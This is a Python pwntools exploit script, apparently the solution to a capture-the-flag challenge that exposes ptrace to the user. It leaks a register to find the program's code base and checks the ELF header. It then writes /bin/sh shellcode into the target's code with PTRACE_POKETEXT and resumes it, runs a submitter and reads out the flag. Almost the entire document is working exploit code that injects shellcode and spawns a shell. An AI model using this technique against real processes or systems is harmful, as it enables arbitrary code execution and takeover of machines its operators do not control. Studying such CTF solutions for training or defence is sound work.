#!/usr/bin/env python3

from pwn import *
import os

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

#io = process('../challenge/build/challenge', level='info')
io = remote(HOST, PORT)

context(arch='amd64', os='linux')

# $r13   : 0x00555555555350  →  <main+0> endbr64
# https://sites.uclouvain.be/SystInfo/usr/include/sys/reg.h.html
# # define R13        2

KILL_RET_OFFSET = 0x13b8

def ptrace_call(io, req_num, addr, data, another=True):
    io.recvline_contains(b'What ptrace request do you want to send?')
    io.sendline(f'{req_num:x}'.encode())
    
    io.recvline_contains(b"What address do you want?")
    io.sendline(f'{addr:x}'.encode())
    
    io.recvline_contains(b"What do you want copied into data?")
    io.sendline(f'{data:x}'.encode())
    
    io.recvuntil(b'ptrace returned ')
    result = int(io.recvline().decode().strip(), 16)

    io.recvline_contains(b'Do another (0/1)?')
    if another:
        io.sendline(b'1')
    else:
        io.sendline(b'0')

    return result

r13 = ptrace_call(io, constants.linux.PTRACE_PEEKUSER, 2*8, 0)
log.info('R13: %lx', r13)

text_base = (r13 & ~0x7FF) - 0x1000
log.info('.text: %lx', text_base)

elf_magic = ptrace_call(io, constants.linux.PTRACE_PEEKTEXT, text_base, 0)
log.info('Magic: %d', p64(elf_magic)[:4] == b'\x7FELF')

kill_ret_addr = text_base + KILL_RET_OFFSET
payload = asm(shellcraft.linux.sh())

cur_addr = kill_ret_addr
rem_payload = payload
while len(rem_payload) > 0:
    block, rem_payload = rem_payload[:8], rem_payload[8:]
    ptrace_call(io, constants.linux.PTRACE_POKETEXT, cur_addr, u64(block.ljust(8, b'\0')))
    cur_addr += 8

ptrace_call(io, constants.linux.PTRACE_CONT, 0, 0, False)


io.sendline('./submitter')
flag = io.recvline().decode().strip()
log.info('Flag: %s', flag)

#io.interactive()
